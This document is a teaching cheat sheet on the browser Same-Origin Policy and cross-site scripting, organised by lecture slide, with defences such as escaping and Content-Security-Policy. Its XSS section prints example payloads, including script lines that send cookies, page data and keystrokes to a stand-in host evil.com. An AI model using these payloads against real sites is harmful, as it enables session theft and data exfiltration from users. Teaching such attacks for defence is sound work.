# Same-Origin Policy (SOP) Cheat Sheet
## Slides 10-19 Explained in Plain English

---

## 🎯 The Big Picture

**What is SOP trying to protect?**
- Prevent evil.com from stealing your data from gmail.com
- Prevent evil.com from performing actions on gmail.com on your behalf
- Keep different websites isolated from each other

**The fundamental rule:**
Scripts can only **READ** content from their own origin. But they can **LOAD** (display/execute) content from other origins.

---

## 📚 Key Concept: Loading vs. Reading

This is the most important distinction to understand:

### LOADING (Usually Allowed)
- Displaying an image from another origin ✅
- Executing a script from another origin ✅
- Embedding a page in an iframe from another origin ✅

### READING (Usually Blocked)
- Reading the pixel data of an image from another origin ❌
- Making a fetch/AJAX request to read JSON from another origin ❌
- Reading the DOM content inside an iframe from another origin ❌

**KEY POINT TO EMPHASIZE:** You can USE cross-origin resources, but you can't READ or INSPECT them.

---

## 🔍 Slide-by-Slide Breakdown

### **Slide 10: fetch() Same-Origin - IT WORKS ✅**

**What's happening:**
1. You visit gmail.com
2. The page's JavaScript runs: `fetch('https://gmail.com/chat.json')`
3. Browser checks: Is the script from gmail.com trying to read data from gmail.com?
4. Yes! Same origin → **ALLOWED**

**The pattern:**
```
Script origin:   gmail.com
Fetching from:   gmail.com
Result:          ✅ WORKS - Same origin
```

**EMPHASIZE:** This is the "normal" case - a website reading its own data.

---

### **Slide 11: fetch() Same-Origin Detailed**

**What's happening:**
1. Gmail.com serves a page with JavaScript
2. That JavaScript makes a fetch request to gmail.com/msgs.json
3. Since both the PAGE and the RESOURCE are from gmail.com → **ALLOWED**
4. The data is returned and displayed

**The key insight:**
The page (gmail.com) can freely read data from its own server (gmail.com).

**EMPHASIZE:** Same-origin fetch requests work seamlessly - this is how modern web apps function.

---

### **Slide 12: fetch() Cross-Origin - BLOCKED ❌**

**What's happening:**
1. You visit facebook.com (evil!)
2. Facebook's JavaScript runs: `fetch('https://gmail.com/msgs.json')`
3. Browser checks: Is facebook.com trying to read data from gmail.com?
4. NO! Different origins → **BLOCKED**
5. Error: "No Access-Control-Allow-Origin header"

**The pattern:**
```
Script origin:   facebook.com
Fetching from:   gmail.com
Result:          ❌ BLOCKED - Different origins
```

**EMPHASIZE:** This is THE core protection of SOP - Facebook can't read your Gmail!

**Why this matters:**
Without this protection, any website could steal your private data from other sites you're logged into.

---

### **Slide 13: Images Cross-Origin - The Question**

**Setting up the question:**
- We just saw that fetch() is blocked cross-origin
- But what about images?
- Can facebook.com embed an image from gmail.com?

**EMPHASIZE:** Now we're exploring a different type of resource - images behave differently than fetch().

---

### **Slide 14: Images Cross-Origin - LOADING WORKS ✅**

**What's happening:**
1. Facebook.com page includes: `<img src="https://gmail.com/img.png"/>`
2. Browser fetches the image from gmail.com
3. Image is **DISPLAYED** on the facebook.com page → **ALLOWED**

**But there's a catch:**
- Facebook CAN display the image ✅
- Facebook CANNOT read the pixel data ❌
- Facebook CANNOT inspect the image contents ❌

**The pattern:**
```
Page origin:     facebook.com
Image from:      gmail.com
Loading:         ✅ ALLOWED
Reading pixels:  ❌ BLOCKED
```

**EMPHASIZE:** Cross-origin images can be LOADED (displayed) but not READ (inspected).

**Why this matters:**
- This is why websites can use images from CDNs (like imgur.com)
- But malicious sites can't extract secret data from those images

---

### **Slide 15: `<script>` Tags Cross-Origin - The Question**

**Setting up the question:**
- Images can be loaded but not read
- What about JavaScript files?
- Can facebook.com load a script from gmail.com?

**EMPHASIZE:** Scripts are different - they need to EXECUTE, not just display.

---

### **Slide 16: `<script>` Tags Cross-Origin - LOADING WORKS ✅**

**What's happening:**
1. Facebook.com includes: `<script src="https://gmail.com/chat.js"></script>`
2. Browser fetches chat.js from gmail.com
3. The script **EXECUTES** → **ALLOWED**

**The pattern:**
```
Page origin:     facebook.com
Script from:     gmail.com
Loading:         ✅ ALLOWED
Executing:       ✅ ALLOWED
```

**EMPHASIZE:** Cross-origin scripts CAN load and execute - this is how CDNs work!

**Real-world example:**
This is why you can load jQuery from Google's CDN:
```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
```

---

### **Slide 17: `<script>` Tags - Which Origin Does It Run Under? 🤔**

**The critical question:**
The script came from gmail.com but is running on facebook.com. When it makes a fetch() request, which origin does it use?

**What's happening:**
1. Facebook.com loaded chat.js from gmail.com
2. chat.js contains: `fetch('https://gmail.com/chat.json')`
3. The script tries to fetch JSON from gmail.com
4. Browser checks: What origin is this script running under?

**THE ANSWER (KEY POINT):**
**Scripts execute under the origin of the PAGE that embedded them, NOT the origin they were loaded from!**

**The pattern:**
```
Page origin:           facebook.com
Script loaded from:    gmail.com
Script executes as:    facebook.com  ← This is the key!
Fetching from:         gmail.com
Result:                ❌ BLOCKED - facebook.com can't read gmail.com
```

**EMPHASIZE THIS HEAVILY:**
Even though the script came from gmail.com, it runs with facebook.com's origin!
This means:
- ✅ It CAN access facebook.com's DOM and cookies
- ❌ It CANNOT read data from gmail.com
- This is why CDNs are safe - jQuery from Google runs with YOUR origin

**Real-world implication:**
When you load jQuery from Google's CDN, it can access YOUR page's DOM and make fetch requests to YOUR server, not Google's.

---

### **Slide 18: `<iframe>` Cross-Origin - The Question**

**Setting up the question:**
- Scripts take on the embedding page's origin
- What about iframes?
- Can facebook.com embed gmail.com in an iframe?
- What origin does the iframe have?

**EMPHASIZE:** iframes are different from scripts - they're entire pages!

---

### **Slide 19: `<iframe>` Cross-Origin - COMPLEX ⚠️**

**What's happening:**
1. Facebook.com includes: `<iframe src="https://gmail.com/chat"></iframe>`
2. Browser loads gmail.com/chat inside the iframe → **ALLOWED**
3. The iframe's JavaScript executes
4. The iframe's script does: `fetch('https://gmail.com/chat.json')`
5. This fetch **WORKS** ✅

**Why does the fetch work?**
Because the script is running inside the gmail.com iframe, which has gmail.com's origin!

**The pattern:**
```
Parent page origin:    facebook.com
Iframe page origin:    gmail.com  ← Different from parent!
Iframe script from:    gmail.com
Iframe script runs as: gmail.com  ← Uses iframe's origin!
Fetching from:         gmail.com
Result:                ✅ WORKS - Same origin (from iframe's perspective)
```

**KEY DIFFERENCES FROM SCRIPTS:**
- 📜 **Scripts (`<script>`):** Take on the embedding page's origin
- 🖼️ **iframes (`<iframe>`):** Keep their own origin (the origin of the iframe's URL)

**EMPHASIZE:**
iframes maintain their own origin! This creates a security boundary:
- ✅ gmail.com iframe CAN read its own data
- ❌ facebook.com parent page CANNOT read the iframe's content
- ❌ gmail.com iframe CANNOT read the parent page's content

**Why this matters:**
- iframes provide isolation - the parent and iframe can't interfere with each other
- This enables widgets, embedded content, and third-party integrations
- BUT this also enables some attacks (like clickjacking)

---

## 📊 Summary Table: What Works and What Doesn't

| Resource Type | Cross-Origin Loading | Cross-Origin Reading | Origin Script Runs Under |
|--------------|---------------------|---------------------|-------------------------|
| **fetch()/AJAX** | ❌ Blocked by default | ❌ Blocked by default | N/A |
| **Images** (`<img>`) | ✅ Allowed | ❌ Blocked | N/A |
| **Scripts** (`<script>`) | ✅ Allowed | N/A | **Embedding page's origin** |
| **iframes** (`<iframe>`) | ✅ Allowed | ❌ Blocked (parent can't read iframe) | **iframe's own origin** |
| **CSS** | ✅ Allowed | ❌ Blocked | N/A |
| **Fonts** | ❌ Blocked by default* | ❌ Blocked | N/A |

*Fonts require CORS headers

---

## 🎓 Teaching Tips: What to Emphasize

### 1. **The Core Protection (Slides 10-12)**
**EMPHASIZE:** "Same-Origin Policy prevents one website from reading another website's data."
- Use the example: "Facebook can't read your Gmail"
- This is THE fundamental security property

### 2. **Loading vs. Reading (Slides 13-14)**
**EMPHASIZE:** "You can DISPLAY cross-origin images but can't READ their pixel data."
- Analogy: "You can look at someone else's photo album, but you can't photocopy the pages"
- This allows sharing (CDNs, images) while maintaining security

### 3. **Scripts Take Embedding Page's Origin (Slides 15-17)**
**EMPHASIZE:** "A script from google.com running on your page executes as YOUR page, not Google's."
- This is counter-intuitive but critical!
- Use jQuery CDN as a concrete example students understand
- Explain why this is safe: jQuery can't send your data to Google

### 4. **iframes Keep Their Own Origin (Slides 18-19)**
**EMPHASIZE:** "iframes are isolated - the parent can't read the iframe, and the iframe can't read the parent."
- Unlike scripts, iframes don't take on the parent's origin
- This creates a security boundary
- Good for widgets/embeds, but can enable attacks (clickjacking)

---

## 💡 Common Student Questions

### Q: "Why can we load cross-origin scripts but not make cross-origin fetch requests?"
**A:** Because scripts EXECUTE as the embedding page's origin, so they're not a direct data leak. Fetch requests would directly expose data from one origin to another.

### Q: "If scripts take on the embedding page's origin, isn't that dangerous?"
**A:** It could be! This is why you should only load scripts from trusted CDNs. A malicious script could steal all your page's data. But it runs as YOUR origin, so it can't steal data from OTHER sites.

### Q: "Can iframes communicate with their parent page at all?"
**A:** Yes, but only through `postMessage()`, which is an explicit, controlled communication channel. They can't directly access each other's DOM.

### Q: "What's CORS (Cross-Origin Resource Sharing)?"
**A:** CORS is a way for servers to explicitly ALLOW cross-origin fetch requests by sending special headers. It's an opt-in relaxation of SOP.

---

## 🎯 The One Sentence Summary

**"Same-Origin Policy blocks scripts from READING cross-origin data (like fetch/AJAX), but allows LOADING cross-origin resources (images, scripts, iframes) - with scripts running as the embedding page's origin and iframes maintaining their own origin."**

---

## 🔑 Key Takeaways for Students

1. **SOP protects against data theft** - one site can't read another site's data
2. **Loading ≠ Reading** - you can display/use cross-origin resources without inspecting them
3. **Scripts inherit the embedding page's origin** - jQuery from Google runs as your page
4. **iframes maintain their own origin** - creating isolation boundaries
5. **This isn't perfect** - XSS attacks can bypass SOP by injecting scripts into trusted origins

---

## 📝 Quick Reference: The Slides

- **Slides 10-12:** fetch() same-origin works, cross-origin blocked ← Core SOP protection
- **Slides 13-14:** Images can load cross-origin but can't be read ← Loading vs. Reading
- **Slides 15-17:** Scripts load cross-origin but run as embedding page's origin ← Critical nuance!
- **Slides 18-19:** iframes load cross-origin and keep their own origin ← Different from scripts!

---

## 🎬 Suggested Teaching Flow

1. **Start with the problem:** "How do we prevent facebook.com from stealing your Gmail?"
2. **Introduce SOP:** "Browsers enforce the Same-Origin Policy"
3. **Show it working:** Slides 10-11 (same-origin fetch works)
4. **Show it blocking:** Slide 12 (cross-origin fetch blocked) ← Pause here, make sure they get this
5. **Add nuance:** Images, scripts, iframes ← Explain loading vs. reading
6. **The tricky part:** Scripts take embedding page's origin ← Spend extra time here
7. **The contrasting case:** iframes keep their own origin ← Compare to scripts
8. **Why it matters:** This enables CDNs, widgets, but also creates risks

---

## 🚨 Common Mistakes to Avoid

1. **Don't say:** "Cross-origin requests are blocked"
   **Do say:** "Cross-origin DATA READING is blocked, but LOADING is often allowed"

2. **Don't say:** "Scripts run with the origin where they came from"
   **Do say:** "Scripts run with the origin of the PAGE that embedded them"

3. **Don't say:** "iframes are the same as scripts"
   **Do say:** "iframes keep their own origin, unlike scripts which take the page's origin"

---

## 🚨 Cross-Site Scripting (XSS) Attack Walkthrough
## Slides 28-33 Explained in Plain English

XSS is how attackers BYPASS the Same-Origin Policy. This is the most dangerous web vulnerability because it completely undermines browser security.

---

### **The Fundamental Problem: Confusing Data and Code**

**What the programmer thinks:**
- User will provide DATA (like their name: "Bob")
- Server will display that data safely

**What actually happens:**
- Attacker provides CODE (like `<script>alert('XSS')</script>`)
- Server treats it as data and echoes it into HTML
- Browser treats it as code and EXECUTES it

---

### **Slide 28-29: Simple HTML Injection**

**Vulnerable code:**
```php
<?php
echo "Hello, " . $_GET["user"] . "!";
?>
```

**Step 1: Normal use**
```
URL: /?user=Bob
Output: Hello, Bob!
Result: ✅ Works as intended
```

**Step 2: HTML injection**
```
URL: /?user=<u>Bob</u>
Output: Hello, <u>Bob</u>!
Result: ⚠️ User input is being interpreted as HTML!
```

**EMPHASIZE:** If HTML can be injected, JavaScript can be injected!

---

### **Slide 30: XSS Attack - The Payload Executes**

**Step 3: JavaScript injection (XSS)**
```
URL: /?user=<script>alert('XSS')</script>
Output HTML: Hello, <script>alert('XSS')</script>!
Result: ❌ JavaScript EXECUTES in the browser!
```

**What happens:**
1. Attacker crafts URL: `https://vuln.com/?user=<script>alert('XSS')</script>`
2. Attacker tricks victim: "Click me!!!" (via email, chat, social media)
3. Victim clicks the link
4. Server echoes the script into the HTML
5. Victim's browser executes the script
6. Script runs with vuln.com's origin → Can access vuln.com's cookies, session, everything!

**EMPHASIZE:** This is called "Reflected XSS" - the malicious script is reflected back from the server.

---

### **Slide 31: Review - Why SOP Alone Isn't Enough**

**Remember from Slide 12:**
- facebook.com CANNOT make fetch() requests to gmail.com
- The browser blocks this due to Same-Origin Policy
- This protects your Gmail from Facebook

**But what if we can inject a script INTO gmail.com?**
- Then the script runs as gmail.com's origin
- It CAN access Gmail data
- SOP doesn't help because the malicious script is now "trusted"

**KEY INSIGHT:** SOP only protects against cross-origin attacks. If you can inject code INTO a trusted origin, SOP is bypassed!

---

### **Slide 32-33: XSS Bypasses SOP - The Complete Attack**

This is the most important slide sequence. Here's the step-by-step attack:

**The Setup:**
- evil.com (attacker)
- gmail.com (victim site with XSS vulnerability)
- You (the user, logged into Gmail)

**The Attack Flow:**

**Step 1: Attacker creates malicious page on evil.com**
```html
<iframe src="https://gmail.com/?user=<script>
    fetch('https://gmail.com/msgs.json')
        .then(response => response.json())
        .then(data => { alert(data); })
</script>"></iframe>
```

**Step 2: Victim visits evil.com**
- You browse to evil.com (maybe from a link in email)

**Step 3: evil.com loads Gmail in an iframe with XSS payload**
- The iframe URL contains the malicious script in the `user` parameter
- Browser makes request to: `gmail.com/?user=<script>fetch(...)...</script>`

**Step 4: Gmail echoes the script (XSS vulnerability)**
```html
<!-- Gmail's vulnerable response -->
Hello, <script>
    fetch('https://gmail.com/msgs.json')
        .then(response => response.json())
        .then(data => { alert(data); })
</script>!
```

**Step 5: The script EXECUTES in Gmail's origin**
- This is the critical moment!
- The script is now running on a gmail.com page
- It has gmail.com's origin

**Step 6: Script makes fetch() request**
```javascript
fetch('https://gmail.com/msgs.json')
```

**Browser's origin check:**
```
Script origin:   gmail.com  (running inside gmail.com iframe)
Fetching from:   gmail.com
Result:          ✅ ALLOWED - Same origin!
```

**Step 7: Data is stolen**
- fetch() returns: `{ new_msgs: 3 }`
- Script displays it: `alert(data)`
- But attacker could send it to evil.com: `fetch('https://evil.com/collect?data=' + data)`

---

### **Why This Works: The Origin Perspective**

**From the browser's perspective:**
```
1. gmail.com page loads
2. Page contains: <script>fetch('https://gmail.com/msgs.json')...</script>
3. Browser thinks: "This is a gmail.com script on a gmail.com page"
4. Browser allows: Same-Origin Policy permits same-origin fetch()
```

**The browser doesn't know:**
- The script came from evil.com's iframe
- The script was injected via XSS
- The script is malicious

**EMPHASIZE:** The browser sees a gmail.com origin accessing gmail.com data and says "OK!"

---

### **The Key Differences: Normal SOP vs XSS**

**Normal Cross-Origin Attack (BLOCKED):**
```
evil.com page → fetch('https://gmail.com/msgs.json')
Browser: "NO! Different origins!"
Result: ❌ BLOCKED by SOP
```

**XSS Attack (SUCCEEDS):**
```
gmail.com page (with injected script) → fetch('https://gmail.com/msgs.json')
Browser: "OK! Same origin!"
Result: ✅ ALLOWED - SOP doesn't help!
```

**EMPHASIZE:** XSS doesn't break SOP - it bypasses it by getting code to execute in the trusted origin!

---

### **Types of XSS**

**1. Reflected XSS (Slides 28-30)**
- Malicious script is in the URL
- Server reflects it back in the response
- Requires victim to click malicious link
- Example: `vuln.com/?user=<script>...</script>`

**2. Stored XSS (Not shown, but mention it)**
- Malicious script is stored in database
- Server serves it to all users
- More dangerous - no link clicking needed
- Example: Forum post with script tag that runs for everyone viewing it

**3. DOM-based XSS (Not shown, but mention it)**
- JavaScript reads URL and writes to DOM
- Never sent to server
- Example: `document.write(location.hash)`

---

### **What Can Attackers Do with XSS?**

Once an attacker can execute JavaScript in a trusted origin, they can:

1. **Steal session cookies**
   ```javascript
   fetch('https://evil.com/steal?cookie=' + document.cookie)
   ```

2. **Steal private data**
   ```javascript
   fetch('/api/user/data').then(data =>
       fetch('https://evil.com/steal', {method: 'POST', body: data})
   )
   ```

3. **Perform actions as the victim**
   ```javascript
   fetch('/transfer?to=attacker&amount=1000', {method: 'POST'})
   ```

4. **Deface the page**
   ```javascript
   document.body.innerHTML = '<h1>Hacked!</h1>'
   ```

5. **Install keyloggers**
   ```javascript
   document.addEventListener('keypress', function(e) {
       fetch('https://evil.com/log?key=' + e.key)
   })
   ```

**EMPHASIZE:** XSS gives attackers complete control over the page in the context of the trusted origin.

---

### **XSS Defense (Slide 36)**

**The fundamental defense: Escape user input!**

**Context matters - different escaping for different contexts:**

**1. Inside HTML content:**
```php
// BAD
echo "Hello, " . $_GET["user"];

// GOOD
echo "Hello, " . htmlspecialchars($_GET["user"], ENT_QUOTES, 'UTF-8');
```
Escapes: `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`, `'` → `&#039;`

**2. Inside JavaScript strings:**
```javascript
// BAD
var name = "<?php echo $_GET['user']; ?>";

// GOOD
var name = "<?php echo json_encode($_GET['user']); ?>";
```

**3. Inside HTML attributes:**
```html
<!-- BAD -->
<div data-user="<?php echo $_GET['user']; ?>">

<!-- GOOD -->
<div data-user="<?php echo htmlspecialchars($_GET['user']); ?>">
```

**Modern approach: Use frameworks that auto-escape**
- React: Auto-escapes by default
- Vue: Auto-escapes in templates
- Angular: Auto-escapes in templates

**Additional defense: Content Security Policy (CSP)**
```
Content-Security-Policy: script-src 'self'
```
- Tells browser to only execute scripts from same origin
- Blocks inline script tags
- Blocks `eval()` and similar dangerous functions

**EMPHASIZE:**
1. **ALWAYS escape user input** - every single time!
2. **Context matters** - different contexts need different escaping
3. **Use frameworks** - don't roll your own escaping
4. **Defense in depth** - use CSP as additional layer

---

### **Common XSS Mistakes**

**❌ Mistake 1: Only escaping sometimes**
```php
// Escaped in one place
echo "<h1>" . htmlspecialchars($title) . "</h1>";

// Forgot to escape here!
echo "<div>" . $comment . "</div>";  // VULNERABLE!
```

**❌ Mistake 2: Wrong escaping for context**
```javascript
// HTML escaping doesn't protect JavaScript context!
var user = "<?php echo htmlspecialchars($_GET['user']); ?>";
// Attacker: /?user="; alert('XSS'); //
// Results in: var user = "&quot;; alert('XSS'); //";
// STILL VULNERABLE!
```

**❌ Mistake 3: Trusting client-side validation**
```javascript
// Client-side validation
if (input.includes('<script>')) {
    alert('No scripts allowed!');
    return;
}
// Attacker can bypass by modifying JavaScript or sending direct HTTP request!
```

**✅ Correct: Server-side escaping, every time, correct for context**

---

### **Teaching Tips for XSS**

**1. Start with the simple case (Slides 28-30)**
- Show normal input: "Bob"
- Show HTML injection: `<u>Bob</u>`
- Show script injection: `<script>alert('XSS')</script>`
- Build up gradually!

**2. Connect to SOP (Slide 31)**
- "Remember how SOP protects Gmail from Facebook?"
- "What if we can get a script to run on Gmail itself?"
- This is the "aha!" moment

**3. Walk through the full attack slowly (Slides 32-33)**
- Draw the iframe on the board
- Trace the request step-by-step
- Emphasize the origin at each step
- "Where is this script running? Gmail! So it has Gmail's powers!"

**4. Show real-world impact**
- Cookie stealing
- Session hijacking
- Account takeover
- This is why XSS is critical severity

**5. Emphasize defense is hard**
- Must escape EVERY instance
- Must escape correctly for context
- One mistake = vulnerability

---

### **The One Sentence Summary for XSS**

**"XSS allows attackers to inject malicious scripts into trusted websites, bypassing the Same-Origin Policy by making the browser think the malicious code is legitimate code from the trusted site."**

---

### **Quick Reference: XSS Slides**

- **Slides 28-29:** HTML injection → JavaScript injection
- **Slide 30:** XSS payload executes → attacker can send malicious link
- **Slide 31:** Review why SOP alone isn't enough
- **Slides 32-33:** Complete XSS attack bypassing SOP via iframe
- **Slide 36:** Defenses: escaping, frameworks, CSP

---

## 🔗 Connections to Later Topics

- **XSS (Slides 28-33):** Bypasses SOP by injecting malicious scripts INTO a trusted origin
- **CSRF (Slides 38-43):** Exploits the fact that browsers automatically send cookies (not blocked by SOP)
- **CORS:** Modern mechanism to selectively relax SOP when needed

---

**Remember:** The Same-Origin Policy is messy and has many special cases because it was retrofitted onto the web after the fact. It's not perfectly elegant, but it's critical for security!
